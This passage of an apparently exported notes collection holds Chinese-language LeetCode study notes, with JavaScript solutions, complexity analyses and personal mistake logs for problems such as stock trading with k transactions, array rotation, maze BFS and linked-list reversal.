最后总结\n\n```javascript\nbase case：\ndp[-1][...][0] = dp[...][0][0] = 0\ndp[-1][...][1] = dp[...][0][1] = -infinity\n\n状态转移方程：\ndp[i][k][0] = max(dp[i-1][k][0], dp[i-1][k][1] + prices[i])\ndp[i][k][1] = max(dp[i-1][k][1], dp[i-1][k-1][0] - prices[i])\n```\n\n#### 代码实现\n\n```javascript\n/**\n * @param {number} k\n * @param {number[]} prices\n * @return {number}\n */\nvar maxProfit = function (k, prices) {\n  let n = prices.length;\n  // 利润\n  let res = 0;\n  // 如果 n 为 0，返回 0, 无需交易，利润为 0\n  // 如果 k 为 0，返回 0, 无法交易，利润为 0\n  if (n === 0 || k === 0) {\n    return 0;\n  }\n\n  // 初始化 dp 数组，三维数组\n  // dp[i][k][0/1] 表示第 i 天，最多进行 k 次交易，持有/不持有股票时的利润\n  let dp = [];\n  for (let i = 0; i < n; i++) {\n    dp[i] = [];\n    for (let j = 0; j <= k; j++) {\n      dp[i][j] = [];\n      for (let l = 0; l < 2; l++) {\n        dp[i][j][l] = 0;\n      }\n    }\n  }\n\n  // base case 1\n  // 如果 k 为 0 , 且没有股票，利润为 0\n  // 如果 k 为 0, 且有股票，利润为 -Infinity，用于表示不可能的情况，方便后续取最大值\n  for (let i = 0; i < n; i++) {\n    dp[i][0][0] = 0;\n    dp[i][0][1] = -Infinity;\n  }\n\n  // 遍历 prices\n  for (let i = 0; i < n; i++) {\n    for (let j = 1; j <= k; j++) {\n      // base case, i 为 -1 时，越界\n      if (i === 0) {\n        dp[i][j][0] = 0;\n        dp[i][j][1] = -prices[i];\n        continue;\n      }\n      dp[i][j][0] = Math.max(dp[i - 1][j][0], dp[i - 1][j][1] + prices[i]);\n      dp[i][j][1] = Math.max(dp[i - 1][j][1], dp[i - 1][j - 1][0] - prices[i]);\n    }\n  }\n\n  res = Math.max(dp[n - 1][k][0], dp[n - 1][k][1]);\n\n  // 返回最大利润\n  return res;\n};\n\n```\n\n#### 复杂度分析\n\n1. 时间复杂度：`O(n * k)`\n    - 我们有两个主要的嵌套循环：\n        - 外层循环遍历 `prices` 数组，共 `n` 次；\n        - 内层循环遍历 `k` 次交易。\n    - 在每次循环中，我们进行常数次操作（比较和赋值）。\n    - 因此，总的时间复杂度是 `O(n * k)`。\n2. 空间复杂度：`O(n * k)`\n    - 我们使用了一个三维数组 dp，其大小为 `n * (k+1) * 2`。\n    - 虽然最后一个维度是`常数（2`），但在大 O 表示法中我们通常忽略常数因子。\n    - 因此，空间复杂度为 `O(n * k)`\n\n### 思路二\n\n#### 代码实现\n\n#### 复杂度分析\n\n## 错误记录一\n\n需要移除了 `dp[-1]` 的初始化，因为这在 JavaScript 中是无效的，在遍历时特殊处理吧，如下图\n\n![cos-blog-832-34-20241012|552](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240810114525.png)\n\n## 错误记录二\n\n初始化一个`二维数组`或者`三维数组`，别使用 `Array.form({lenght:n})` 之类的了，使用下面代码肯定不会出问题\n\n```javascript\n  // 初始化 dp 数组，三维数组\n  // dp[i][k][0/1] 表示第 i 天，最多进行 k 次交易，持有/不持有股票时的利润\n  let dp = [];\n  for (let i = 0; i < n; i++) {\n    dp[i] = [];\n    for (let j = 0; j <= k; j++) {\n      dp[i][j] = [];\n      for (let l = 0; l < 2; l++) {\n        dp[i][j][l] = 0;\n      }\n    }\n  }\n```\n\n","XA0GxMZf":"\n# 轮转数组\n\n\n`#leetcode`   `#2024/08/05`   \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![image.png600|872](https://832-1310531898.cos.ap-beijing.myqcloud.com/202408050809389.png?imageSlim)\n\n## 2. 解题思路\n\n### 2.1. 解法一：分割数组，然后再组合数组\n\n```javascript\n/**  \n * @param {number[]} nums  \n * @param {number} k  \n * @return {void} Do not return anything, modify nums in-place instead.  \n */ 数组分割  \nvar rotate = function (nums, k) {  \n    const n = nums.length;  \n    // base 1: 处理 k 大于数组长度的情况  \n    k %= n; \n    // base 2:  \n    // 如果 k 为 0 或数组长度为 0 或 1，无需旋转  \n    if (k === 0 || n <= 1) {  \n        return;  \n    }  \n    const part1 = nums.slice(-k);  \n    const part2 = nums.slice(0, n - k);  \n    // 直接修改 nums \n    // nums.length = 0;  \n    // nums = [...part1, ...part2];  \n    \n    // 直接修改原数组  \n    // 从 0 到 n 删除 n 个元素，然后插入 part1 和 part2  \n    nums.splice(0, n, ...part1, ...part2)  \n  \n};\n```\n\n- 时间复杂度：`O(n)` \n- 空间复杂度：`O(n)`（因为我们创建了两个临时数组 `part1` 和 `part2`）\n\n> [!danger]\n> 注意上面的两个 base 条件\n\n### 2.2. 解法二：反转法\n\n假设我们有一个数组 `[1, 2, 3, 4, 5, 6, 7]`，需要向右旋转 3 步。\n\n- 步骤 1：反转整个数组 `[1, 2, 3, 4, 5, 6, 7] -> [7, 6, 5, 4, 3, 2, 1]`\n\t- 想象一下，我们把这个数组写在一条绳子上，然后把绳子翻转过来。\n- 步骤 2：反转前 k 个元素（这里 k = 3 ）\n\t- `[7, 6, 5, 4, 3, 2, 1] -> [5, 6, 7, 4, 3, 2, 1]`\n\t- 想象我们把绳子的前3个元素`（7, 6, 5）`单独拿出来翻转。\n- 步骤 3：反转剩余的元素 `[5, 6, 7, 4, 3, 2, 1] -> [5, 6, 7, 1, 2, 3, 4]`\n\t- 我们把剩下的元素`（4, 3, 2, 1）`也翻转一下。\n- 最终结果：`[5, 6, 7, 1, 2, 3, 4]`\n\n这就是我们想要的结果！\n\n为什么这个方法有效？\n\n1. **第一次**反转把整个数组颠倒，将\"需要移动到前面的元素\"放到了数组的开头，但顺序是反的。\n2. **第二次**反转**纠正了**这些元素的顺序。\n3. **第三次**反转则**纠正了**其余元素的顺序。\n\n这个方法的巧妙之处在于：\n- 它不需要额外的空间来存储元素。\n- 每个元素只被移动了常数次，所以效率很高。\n- 它可以处理各种不同的旋转步数，包括大于数组长度的情况。\n\n```javascript\n1. **第一次**反转把整个数组颠倒，将\"需要移动到前面的元素\"放到了数组的开头，但顺序是反的。\n2. **第二次**反转**纠正了**这些元素的顺序。\n3. **第三次**反转则**纠正了**其余元素的顺序。\n\n// 数组分割\nvar rotate = function (nums, k) {\n  // base 1 : 处理 k 大于数组长度的情况\n  k %= nums.length;\n\n  // base 2 : 如果 k 为 0 或数组长度为 0 或 1，无需旋转\n  if (k === 0 || nums.length <= 1) {\n    return;\n  }\n\n  // 翻转 ① : 翻转整个数组\n  reverse(nums, 0, nums.length - 1);\n  // 翻转 ② : 翻转前 k 个元素\n  reverse(nums, 0, k - 1);\n  // 翻转 ③ : 翻转后 n - k 个元素\n  reverse(nums, k, nums.length - 1);\n};\n\n/**\n * @description 翻转数组，从 start 到 end\n * */\nfunction reverse(nums, start, end) {\n  while (start < end) {\n    const temp = nums[start];\n    nums[start] = nums[end];\n    nums[end] = temp;\n    start++;\n    end--;\n  }\n}\n\n```\n\n- 时间复杂度为 `O(n)`\n- 空间复杂度为 `O(1)`\n\t- 直接在原数组上操作，不需要额外的空间（除了几个临时变量）。\n\n> [!danger]\n> 能够处理所有边界情况，包括 `k = 0` 和数组长度为 0 或 1 的情况 和 k > 数组长度的情况\n\n### 2.3. 解法三：使用额外的数组\n\n通过创建一个新的数组来存储结果，从而实现数组的轮转\n\n这里不展示代码了\n\n## 3. 错误记录\n\n> [!danger]\n> 解法一中： 在 JavaScript 中，当我们将一个**数组**作为参数传递给函数时，我们传递的是**数组的引用**。在函数内部，`nums = [...part1, ...part2]` 这行代码创建了一个新的数组并将 `nums` 变量指向这个新数组，但这并不会改变原始数组的内容。函数外部的原数组保持不变\n\n","FPyCQLm9":"\n# 迷宫中离入口最近的出口\n\n`#leetcode`   `#2024/09/16`  `#算法`  `#图BFS` `#算法/图`  `#迷宫问题`\n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![cos-blog-832-34-20241012|600](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240916080248.png)\n\n> [!danger]\n>  上面的 maza 不是邻接矩阵，m 都不等于 n，邻接矩阵一定是 n*n\n\n\n\n## 思路\n\n这个问题本质上是一个寻找**最短路径**的问题，通常可以使用**广度优先搜索**（BFS）来解决。BFS 可以保证首先找到的出口就是最近的出口。\n\n- 关键点\n\t- 迷宫问题，定义4 个方向，上下左右扩散\n\t- 初始化 `m*n` 的 visited 二维数组\n\n## 代码实现\n\n\n```javascript hl:9,19,36,37\n/**\n * @param {character[][]} maze 邻接矩阵\n * @param {number[]} entrance  出口\n * @return {number}  最少的出口需要走几步\n */\nvar nearestExit = function (maze, entrance) {\n  const m = maze.length;\n  const n = maze[0].length;\n  // 上下左右四个方向 [x,y]，x 和 y 分别表示横纵坐标的增量\n  const dirs = [\n    [0, 1], // 向右\n    [0, -1], // 向左\n    [1, 0], // 向下\n    [-1, 0], // 向上\n  ];\n\n  // BFS 算法的队列和 visited 数组\n  const queue = [];\n  // 初始化一个 m * n 的 visited 二维数组\n  const visited = Array.from({ length: m }, () => Array(n).fill(false));\n  // 将入口放入队列\n  queue.push(entrance);\n  // 标记入口已访问\n  visited[entrance[0]][entrance[1]] = true;\n  // 启动 BFS 算法从 entrance 开始像四周扩散\n  let step = 0;\n  while (queue.length) {\n    const sz = queue.length;\n    step++;\n    // 扩散当前队列中的所有节点\n    for (let i = 0; i < sz; i++) {\n      // 取出队首节点\n      const cur = queue.shift();\n      // 每个节点都会尝试向上下左右四个方向扩展一步\n      for (const dir of dirs) {\n        // cur[0] 和 cur[1] 分别为当前节点的横纵坐标,通过下面的方式计算\n        // 上下左右移动后新的坐标\n        const x = cur[0] + dir[0];\n        const y = cur[1] + dir[1];\n        // 如果新坐标 (x, y) 超出边界，或者遇到墙壁，或者已经访问过，都直接跳过\n        if (\n          x < 0 ||\n          x >= m ||\n          y < 0 ||\n          y >= n ||\n          visited[x][y] ||\n          maze[x][y] === \"+\"\n        ) {\n          continue;\n        }\n        // 如果走到边界（出口），返回步数\n        if (x === 0 || x === m - 1 || y === 0 || y === n - 1) {\n          // 走到边界（出口）\n          return step;\n        }\n        // 记录已访问\n        visited[x][y] = true;\n        // 将新节点加入队列\n        queue.push([x, y]);\n      }\n    }\n  }\n  return -1;\n};\n\n```\n\n## 复杂度分析\n\n- 时间复杂度：O(m * n) ，\n\t- 在最坏的情况下，我们可能需要访问迷宫中的每一个单元格。\n\t- 平均情况下，由于**墙壁**的存在，实际访问的单元格数量会少于 m * n\n- 空间复杂度：O(m * n)\n\t1. 主要空间使用：O(m * n)\n\t    - visited 数组：需要 O(m * n) 空间来存储每个单元格的访问状态。\n\t    - 队列：在最坏情况下，可能需要存储所有的 m * n 个单元格。\n\t2. 其他空间使用：\n\t    - dirs 数组（方向数组）：常数空间 O(1)。\n\t    - 其他变量（如 step, sz 等）：常数空间 O(1)。\n\t3. 总空间复杂度：O(m * n)\n\t    - 主要由 visited 数组和队列决定。\n## 错误记录\n\n- 别一上来就想着这个 maza 不是邻接矩阵，那么构建一个？\n\t- 邻接矩阵不好搞，那么直接构建一个邻接表？\n- 这题的本质还是迷宫问题，迷宫问题有迷宫问题的套路\n","5DLPkj4S":"\n# 二叉树的右视图\n\n\n`#leetcode`   `#2024/09/08`  `#算法`  `#算法/二叉树`   `#BFS` `#DFS` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![cos-blog-832-34-20241012|560](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908083048.png)\n\n## 思路一：DFS\n\n- 要点一：使用 DFS，我们可以先访问右子树，然后左子树。这样可以确保每一层最右边的节点首先被访问\n- 要点二：前序位置 push(root.val)\n\n### 代码实现\n\n```javascript\n/**\n * @param {TreeNode} root\n * @return {number[]}\n */\nvar rightSideView = function (root) {\n  const res = [];\n  if (root == null) {\n    return [];\n  }\n  traverse(root, 0, res);\n  return res;\n};\n\n/**\n * @description 定义：从二叉树的根节点开始，按照「根节点、右子树、左子树」的顺序遍历二叉树\n * @param {TreeNode} root\n * @param {number} depth\n * @param {number[]} res\n */\nvar traverse = function (root, depth, res) {\n  // 递归的终止条件，root 为空\n  if (root == null) {\n    return;\n  }\n  //要点①：前序遍历位置, 先访问当前节点，再递归地访问右子树和左子树\n  if (res.length == depth) {\n    res.push(root.val);\n  }\n  // 要点②：一定要先递归访问右子树，再递归访问左子树\n  traverse(root.right, depth + 1, res);\n  traverse(root.left, depth + 1, res);\n};\n```\n\n## 思路二：BFS\n\n使用 BFS，我们可以**逐层遍历树**，并在**每一层中取最右边的节点**\n\n### 代码实现\n\n```javascript hl:22\n/**\n * @param {TreeNode} root\n * @return {number[]}\n */\nvar rightSideView = function (root) {\n  const res = [];\n\n  // 使用 BFS 层序遍历，每层最后一个节点就是右视图的节点\n  // 1. 定义一个队列，用于存储每一层的节点\n  const queue = [];\n  // 2. 将根节点放入队列中\n  queue.push(root);\n\n  // 3. 开始 BFS 遍历\n  while (queue.length) {\n    // 3.1. 获取当前层的节点个数\n    const levelSize = queue.length;\n    // 3.2. 遍历当前层的节点\n    for (let i = 0; i < levelSize; i++) {\n      // 3.2.1. 取出队头元素\n      const node = queue.shift();\n      // 3.2.2. 如果当前节点为空，直接跳过\n      if (node == null) {\n        continue;\n      }\n      // 3.2.3. 如果当前节点是当前层的最后一个节点，将当前节点的值放入结果数组中\n      if (i == levelSize - 1) {\n        res.push(node.val);\n      }\n      // 3.2.4. 最后，将当前节点的左右子节点放入队列中\n      if (node?.left) {\n        queue.push(node.left);\n      }\n      if (node?.right) {\n        queue.push(node.right);\n      }\n    }\n  }\n\n  return res;\n};\n\n```\n\n### 注意点\n\n- 取队列头：`queue.shift()`\n- 每次 `push` 时，需要判断有值再 `push`\n\n## 原题地址\n\nhttps://leetcode.cn/problems/binary-tree-right-side-view/description\n","cN9iUgV2":"\n# 反转链表\n\n\n`#leetcode`   `#2024/08/10`  `#算法/链表`   `#算法/链表`  \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240810173705.png)\n\n## 解题思路\n\n### 思路一：递归魔法\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240810173541.png)\n\n#### 代码实现\n\n```javascript\n/**\n * Definition for singly-linked list.\n * function ListNode(val, next) {\n *     this.val = (val===undefined ? 0 : val)\n *     this.next = (next===undefined ? null : next)\n * }\n */\n/**\n * @param {ListNode} head\n * @return {ListNode}\n */\nvar reverseList = function (head) {\n  // base case 1: 如果 head 为空，返回 null\n  if (head === null) {\n    return null;\n  }\n  // base case 2: 链表只有一个节点（head.next === null），直接返回这个节点。\n  // 递归到最后一个节点，返回最后一个节点\n  if (head.next === null) {\n    return head;\n  }\n\n  let last = reverseList(head.next);\n  head.next.next = head;\n  head.next = null;\n\n  return last;\n};\n\n```\n\n> `head.next === null` 时，代表链表只有一个节点\n\n#### 复杂度分析\n\n- 时间复杂度：`O(n)`\n    - 其中 n 是链表的长度\n    - 函数会递归 n 次，每次递归的操作是常数时间\n- 空间复杂度：`O(n)`\n    - 递归调用会使用栈空间，最大深度为 n\n    - 没有使用额外的数据结构，所有额外空间都来自递归调用栈\n\n","tNCdvO9i":"\n# 链表最大孪生和\n\n\n`#leetcode`   `#2024/08/10`  `#算法/链表`  \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![cos-blog-832-34-20241012|576](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240810174638.png)\n\n- 理解\n\t- 你先选第一个节点和最后一个节点，计算它们的和。\n\t- 然后选第二个节点和倒数第二个节点，计算和。\n\t- 依此类推，直到你到达链表的中间。\n- 举个例子：假设链表是：`[5,4,2,1]`\n    - 第一对孪生节点：5 和 1，和是 6\n    - 第二对孪生节点：4 和 2，和是 6\n    - 所有孪生和中最大的是 6，所以答案是 6\n\n## 解题思路\n\n1. **找到链表的中点**：\n    - 我们可以使用**快慢指针**的方法。快指针每次走两步，慢指针每次走一步\n    - 当快指针到达链表末尾时，慢指针会到达链表的**中点位置**\n        - 因此，**慢指针可以用来分割链表**。\n2. **反转链表的后半部分**：\n    - 通过`慢指针`，我们可以获取到链表的后半部分\n    - 反转完后，一定要**断开**前后两部分，让 `slow.next = null` 即可\n3. **计算孪生和并找出最大值**：\n    - 定义两个指针：`second` 和 `first`\n        - 一个从链表头开始（指向前半部分）\n        - 一个从反转后的链表头开始（指向新的后半部分）。\n    - 同时移动两个指针，计算两个对应节点的和并持续更新最大孪生和。\n4. **恢复链表结构（可选）**：\n    - 如果不需要保存链表的原始状态，这步可以省略。\n    - 否则，我们可以再反转一次后半部分的链表，将其恢复为原始状态。\n\n### 代码实现\n\n```javascript\n/**\n * Definition for singly-linked list.\n * function ListNode(val, next) {\n *     this.val = (val===undefined ? 0 : val)\n *     this.next = (next===undefined ? null : next)\n * }\n */\n/**\n * @param {ListNode} head\n * @return {number}\n */\nvar pairSum = function (head) {\n  // ① 先使用快慢指针找到链表的中间节点\n  let slow = head;\n  let fast = head;\n  while (fast !== null && fast.next !== null) {\n    slow = slow.next;\n    fast = fast.next.next;\n  }\n\n  // ② 反转后半部分链表\n  let secondHalf = reverseList(slow);\n\n  // 断开前半部分链表和后半部分链表的连接\n  slow.next = null;\n\n  // ③ 遍历，找到最大值\n  let sum = 0;\n  let first = head;\n  let second = secondHalf;\n\n  while (first !== null && second !== null) {\n    sum = Math.max(sum, first.val + second.val);\n    first = first.next;\n    second = second.next;\n  }\n\n  return sum;\n};\n\nvar reverseList = function (head) {\n  // base case: 如果 head 为空，返回 null\n  if (head === null) {\n    return null;\n  }\n  // base case: 如果 head.next 为空，返回 head\n  // 递归到最后一个节点，返回最后一个节点\n  if (head.next === null) {\n    return head;\n  }\n\n  let last = reverseList(head.next);\n  head.next.next = head;\n  head.next = null;\n\n  return last;\n};\n\n```\n\n\n### 复杂度分析\n\n- 时间复杂度：`O(n)`\n\t- 其中 n 是链表的长度\n\t- 我们遍历链表找中点，反转后半部分，然后再次遍历计算最大和，每步操作都是 `O(n)`。\n- 空间复杂度：`O(1)`，只使用了常数额外空间\n\n","7ulK8iOE":"\n# 找出两数组的不同\n\n`#算法` `#leetcode`  `#2024/07/28` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/2957c151de2e1cf09ca75212d17676ae.png)\n\n## 解题思路\n\n1. `nums1` 中有，但 nums2 `中没有的数字`\n2. `nums2` 中有，但 `nums1` 中没有的数字\n\n## 代码实现\n```javascript\n/**\n * @param {number[]} nums1\n * @param {number[]} nums2\n * @return {number[][]}\n */\nvar findDifference = function (nums1, nums2) {\n  const s1 = new Set(nums1);\n  const s2 = new Set(nums2);\n\n  const res1 = [...s1].filter((num) => !s2.has(num));\n  const res2 = [...s2].filter((num) => !s1.has(num));\n\n  return [res1, res2];\n};\n```\n\n### 复杂度分析\n\n## 错误记录\n\n","A2ySsyJM":"\n# 相等行列对\n\n`#leetcode`  `#算法/哈希` \n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png600](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407260948859.png?imageSlim)\n\n## 解题思路\n \n- 第一步：创建一个`哈希表（Map）`来存储每一行的信息。 \n- 第二步：遍历矩阵的每一行\n\t- 将行转换为一个`唯一的字符串`表示（例如，用逗号连接元素）。\n\t- 在哈希表中记录这个字符串表示及其出现次数。 \n- 第三步：遍历矩阵的每一列，重点逻辑都在这里面\n\t- 同样将列转换为字符串表示。\n\t- 检查这个字符串是否在哈希表中存在。\n\t\t- 如果存在，将`计数器`增加哈希表中记录的出现次数。 \n- 最后：返回最终的计数器值。\n\n## 代码实现\n\n```javascript\n/**  \n * @param {number[][]} grid  n x n grid  \n * @return {number}  \n */  \nvar equalPairs = function (grid) {  \n    // 结果  \n    let res = 0;  \n    const len = grid.length;  \n    // 处理行  \n    // 用于记录每一行出现的次数, key 为行字符串，value 为出现次数  \n    const rowMap = new Map();  \n    for (let i = 0; i < len; i++) {  \n        const rowStr = grid[i].join(',');  \n        rowMap.set(rowStr, (rowMap.get(rowStr) || 0) + 1);  \n    }  \n    // 处理列，判断是否在行中出现过  \n    for (let i = 0; i < len; i++) {  \n        let cols = [];  \n        for (let j = 0; j < len; j++) {  \n            cols.push(grid[j][i]);  \n        }  \n        let colStr = cols.join(',');  \n        // 判断是否在行中出现过  \n        if (rowMap.has(colStr)) {  \n            // ::::这里不能只是+1，出现多少次就得加多少次  \n            res += rowMap.get(colStr);  \n        }  \n    }  \n    return res;  \n};\n```\n\n### 复杂度分析\n\n- **时间复杂度**：`O(n^2)`\n\t- 很简单，看处理列里面，两个 for 循环\n- **空间复杂度**：`O(n^2)`\n\t- 虽然 `cols` 看起来就是一个数组，但是每次都会处理  `cols.push(grid[j][i]);` 所以，复杂度也是 `O(n^2)`\n\n## 错误记录","WaUzeAfa":"\n# 除自身以外数组的乘积\n\n`#leetcode`  `#2024/07/28`  `#算法/前缀和`  `#算法/前缀积` \n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n> [!danger]\n> 上面截图有错别字，**除自己以外的元素的乘积 /  自己**\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/065e86225fe756d152dd30d51cee831b.png)\n\n## 解题思路\n\n- 构造一个 `prefix` 数组记录`「前缀积」`\n- 再用一个 `suffix` 记录 **「后缀积」**\n- `当前元素之外其他元素的积` = `当前元素的前缀积` * `当前元素的后缀积`\n\n> 不能先所有数的乘积（假如为` sum`），然后遍历每个元素计算 `sum/item` ，不行，见下面错误记录\n\n## 代码实现\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {number[]}\n */\nvar productExceptSelf = function (nums) {\n  // 前缀积\n  const prefix = new Array(nums.length).fill(1);\n  // 后缀积\n  const suffix = new Array(nums.length).fill(1);\n\n  // 初始化前缀积\n  for (let i = 1; i < nums.length; i++) {\n    prefix[i] = prefix[i - 1] * nums[i - 1];\n  }\n\n  // 初始化后缀积\n  for (let i = nums.length - 2; i >= 0; i--) {\n    suffix[i] = suffix[i + 1] * nums[i + 1];\n  }\n\n  // 结果\n  const result = [];\n  // 遍历数组，计算结果，即前缀积 * 后缀积\n  for (let i = 0; i < nums.length; i++) {\n    result.push(prefix[i] * suffix[i]);\n  }\n  return result;\n};\n\n```\n\n### 空间复杂度再压缩？\n\n遍历的时候再动态更新`result` ，如下\n\n```javascript\n/**  \n * @param {number[]} nums  \n * @return {number[]}  \n */  \nvar productExceptSelf = function (nums) {  \n  const length = nums.length;  \n  const result = new Array(length).fill(1);  \n\n  // 计算前缀积并存储在结果数组中  \n  let prefixProduct = 1;  \n  for (let i = 0; i < length; i++) {  \n    result[i] = prefixProduct;  \n    prefixProduct *= nums[i];  \n  }  \n\n  // 计算后缀积并更新结果数组  \n  let suffixProduct = 1;  \n  for (let i = length - 1; i >= 0; i--) {  \n    result[i] *= suffixProduct;  \n    suffixProduct *= nums[i];  \n  }  \n\n  return result;  \n};\n```\n\n## 错误记录\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {number[]}\n */\nvar productExceptSelf = function (nums) {\n  const sum = nums.reduce((acc, cur) => acc * cur, 1);\n  return nums.map((num) => sum / num);\n};\n\n```\n\n","f0Vi9O7j":"\n# 滑动窗口最大值\n\n\n`#leetcode`   `#2024/08/11`  `#算法/单调列队`   `#算法/滑动窗口` \n\n![图片&文件](./files/20241119.png)\n\n> 详见 [1. 单调列队算法](/post/4O7uIpwG.html)\n\n---\n\n\n![1. 单调列队算法](/post/4O7uIpwG.html)","WBTbXreF":"\n# 从字符串中移除星号\n\n\n`#leetcode`  `#算法/栈` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![image.png600|592](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407271718841.png?imageSlim)\n\n## 2. 解题思路\n\n1.  我们使用一个`栈`来存储字符。\n2.  遍历输入字符串 `s` 中的每个字符：\n    - 如果当前字符`不是星号`，我们就把它`推入栈`中。\n    - 如果当前字符`是星号`，我们就从`栈顶弹出一个字符`（如果栈不为空）。\n3. 最后，栈中剩下的字符就是我们的结果。\n\t- 我们使用 `join()` 方法将栈中的字符连接成一个字符串\n\n## 3. 代码实现\n\n```javascript\n/**\n * @param {string} s\n * @return {string}\n */\nvar removeStars = function (s) {\n  // 使用栈\n  let stack = [];\n  for (let i = 0; i < s.length; i++) {\n    if (s[i] === \"*\") {\n      stack.pop();\n    } else {\n      stack.push(s[i]);\n    }\n  }\n  return stack.join(\"\");\n};\n\n```\n\n### 3.1. 复杂度分析\n\n- 时间复杂度是 `O(n)`，其中 n 是字符串的长度。\n- 空间复杂度也是 `O(n)`，因为在最坏的情况下（没有星号）\n\n## 4. 错误记录\n\n","zzGqLOkh":"\n# 二叉树的所有路径\n\n`#leetcode` \n\n```javascript\nvar binaryTreePaths = function (root) {\n  let res = [];\n\n  function traverse(node, paths) {\n    if (!node) {\n      return;\n    }\n\n    if (!node.left && !node.right) {\n      paths.push(node.val);\n      res.push([...paths]);\n      paths.pop();\n      return;\n    }\n\n    paths.push(node.val);\n    traverse(node.left, paths);\n    traverse(node.right, paths);\n\n    paths.pop();\n  }\n\n  traverse(root, []);\n\n  return res.map((item) => {\n    return item.join(\"->\");\n  });\n};\n\n```","IMOVNaYn":"\n# 删除有序数组中的重复项\n\n\n`#2024/07/28` `#leetcode`  `#算法/双指针` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png600|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407281631265.png?imageSlim)\n\n## 解题思路\n\n- 双指针技巧\n- 原地修改\n\n## 代码实现\n```javascript\n/**\n * @param {number[]} nums\n * @return {number}\n */\nvar removeDuplicates = function (nums) {\n  // 快慢指针,都从0开始\n  let fast = 0;\n  let slow = 0;\n  // 快指针遍历数组\n  while (fast < nums.length) {\n    // 当快指针对应的元素不等于慢指针对应的元素时\n    if (nums[fast] !== nums[slow]) {\n      // 不相等时，先移动模板\n      slow++;\n      // 将快指针对应的元素赋值给慢指针对应的元素\n      nums[slow] = nums[fast];\n    }\n    // 快指针，每遍历一个元素，就向后移动一次\n    fast++;\n  }\n  // 删除后面的元素\n  nums.splice(slow + 1);\n\n  return slow + 1;\n};\n\n```\n\n## 错误记录\n\n","Tib6Sq3q":"\n# 移除元素\n\n\n`#2024/07/28` `#leetcode`  `#算法/双指针` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png600|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407281629958.png?imageSlim)\n\n## 解题思路\n\n- 快慢指针\n- 知道了 `slow`，将后面的元素重置为`_` (按照题设要求)\n\n## 代码实现\n```javascript\n/**\n * @param {number[]} nums\n * @param {number} val\n * @return {number}\n */\nvar removeElement = function (nums, val) {\n  // 快慢指针,都从0开始\n  let fast = 0;\n  let slow = 0;\n  // 快指针遍历数组\n  while (fast < nums.length) {\n    // 当快指针对应的元素不等于 val 时\n    if (nums[fast] !== val) {\n      // 将快指针对应的元素赋值给慢指针对应的元素\n      nums[slow] = nums[fast];\n      slow++;\n    }\n    // 快指针，每遍历一个元素，就向后移动一次\n    fast++;\n  }\n  // 修改 nums 后面的元素为 _\n  for (let i = slow; i < nums.length; i++) {\n    nums[i] = \"_\";\n  }\n  return slow;\n};\n\n```\n\n## 错误记录\n\n","LVuJxrc5":"\n# H 指数\n\n\n`#leetcode`   `#2024/08/19`  `#算法` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![cos-blog-832-34-20241012|632](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240819065111.png)\n\n## 2. 思路\n\n- 将引用次数**降序**排序\n- 从前向后遍历，当**引用次数大于当前索引**时，h 指数加 1 \n\n### 2.1. 代码实现\n\n```javascript\n/**\n * @param {number[]} citations\n * @return {number}\n */\nvar hIndex = function (citations) {\n  let res = 0;\n  // ① 先排序，降序排序\n  citations.sort((a, b) => b - a);\n\n  // ②  从前向后遍历，当**引用次数大于当前索引**时，h 指数加 1 \n  for (let i = 0; i < citations.length; i++) {\n    //  如果当前引用数大于等于当前下标值，则 h 值为当前下标值\n    if (citations[i] >= i + 1) {\n      res = i + 1;\n      // 否则，直接跳出循环\n    } else {\n      break;\n    }\n  }\n\n  return res;\n};\n\n```\n\n### 2.2. 复杂度分析\n\n- 时间复杂度分析：\n\t1. 排序步骤：\n\t    - 使用了 JavaScript 的内置排序方法 `sort()`。\n\t    - 大多数现代浏览器的 `sort()` 方法实现为快速排序的变体，平均时间复杂度为 O(n log n)。\n\t2. 遍历步骤：\n\t    - 最坏情况下，需要遍历整个数组，复杂度为 O(n)。\n\t3. 总体时间复杂度：\n\t    - O(n log n) + O(n) = `O(n log n)`\n\t    - 排序步骤决定了整体的时间复杂度。\n- 空间复杂度分析：\n    1. 排序：\n        - 取决于具体的排序算法实现。\n        - 最好情况下是 O(1)，但某些实现可能需要 O(log n) 或 O(n) 的额外空间。\n    2. 其他变量：\n        - 使用了常数级额外空间（res 和 i）。\n    3. 总体空间复杂度：\n        - 主要取决于排序算法的实现，一般为 `O(1) 到 O(n)` 之间。\n\n### 2.3. 错误记录\n\n## 3. 其他思路\n\n- 计数排序\n- 二分查找法\n\n> [!danger]\n> 但忽略了，第一种很直接了，别忘了目的何在，又不是做研究，没必要深究了\n\n","NES1JtkZ":"\n# 移动零\n\n\n`#算法/双指针`  `#leetcode` `#2024/07/28` \n\n\n## 